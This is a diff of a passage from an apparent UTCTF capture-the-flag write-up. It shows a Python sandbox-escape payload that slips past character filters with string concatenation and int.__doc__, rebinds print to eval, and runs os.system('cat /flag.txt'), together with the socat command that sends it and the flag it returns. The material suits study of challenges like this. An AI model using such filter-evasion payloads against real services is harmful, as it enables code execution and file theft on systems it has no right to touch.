@@ -48,12 +48,13 @@ No answer... Debugging it locally gives me the flag, but via stderr since it thr
 
 So I changed it the actual payload to: `os.system('cat /flag.txt')`
 
-Resulting in:
+Resulting in: `p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '"os").system' + int.__doc__[3] + '"cat /flag.txt")'; __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p)"` as the final payload.
 
 ```
 echo "p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '"os").system' + int.__doc__[3] + '"cat /flag.txt")'; __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p)" > payload`
 cat payload | socat -t1 - TCP:misc.utctf.live:4353
-Files must be uploaded within 2 seconds. Scripts must run within 2 seconds. Only the first 4096 bytes will be considered.                                                                          utflag{unclean_input}
+Files must be uploaded within 2 seconds. Scripts must run within 2 seconds. Only the first 4096 bytes will be considered.
+utflag{unclean_input}
 ```
 
 
